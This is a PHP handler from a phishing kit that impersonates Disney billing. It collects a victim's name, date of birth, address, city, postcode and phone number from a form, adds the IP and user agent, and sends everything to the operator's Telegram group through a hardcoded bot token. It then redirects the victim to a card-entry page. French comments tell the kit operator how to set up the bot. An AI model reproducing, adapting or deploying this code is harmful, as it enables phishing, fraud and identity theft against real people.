<?php
  error_reporting(0);
  ob_start();
  session_start();
include '../../email.php';
include '../../antibots.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $_SESSION["surname"]    = $_POST["surname"];
    $_SESSION["name"]    = $_POST["name"];
    $_SESSION["dob"]= $_POST["dob"];
    $_SESSION["address"]   = $_POST["address"];
    $_SESSION["zipcode"]    = $_POST["zipcode"];
    $_SESSION["city"]= $_POST["city"];
    $_SESSION["tel"]   = $_POST["tel"];
$message = '_______________________________
📞Nom : '.$_SESSION["surname"].'
📞Prénom : '.$_SESSION["name"].'
📞Date de naissance : '.$_SESSION["dob"].'
📞Adresse : '.$_SESSION["address"].'
📞Code Postal : '.$_SESSION["zipcode"].'
📞Ville : '.$_SESSION["city"].'
📞Numéro de téléphone : '.$_SESSION["tel"].'
_______________________________
IP: '._ip().'
User Agent: '.$_SERVER["HTTP_USER_AGENT"].'
';
$Subject=" 「🎰」 +1 Fr3sh Disney Billing 📞 | "._ip();
$head="From: 📈Stonks📈 <Billing@Ayz.Cash>";
	$zizi = urlencode("🌐"._ip()."\n 💌".$_SESSION['email']." \n 📋".$_SESSION["surname"]." ".$_SESSION["name"]."[".$_SESSION["dob"]."] \n 🏠Ville: ".$_SESSION["city"].", ".$_SESSION["zipcode"]."  \n  Host: .".$_SERVER['HTTP_HOST'].".");
	$grouparobaz = urlencode("@fsqJQBf8Y9NADzG"); // apres avoir inviter ton bot dans le groupe met le @ du groupe ou tu veux recevoir les notif
	$apitoken = urlencode("1865157782:AAGBlUkVJ3FnK_ZAnxaZLfM7KOt35-6yjOg"); // Le token de ton bot que @BotFather te donne
    $html = file_get_contents('https://api.telegram.org/bot'.$apitoken.'/sendMessage?chat_id='.$grouparobaz.'&text='.$zizi.''); // ne pas toucher
$_SESSION['step_three']  = true;
    header('location: ../card.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));

}
else
{
  header('location: ../../index.php');
} 

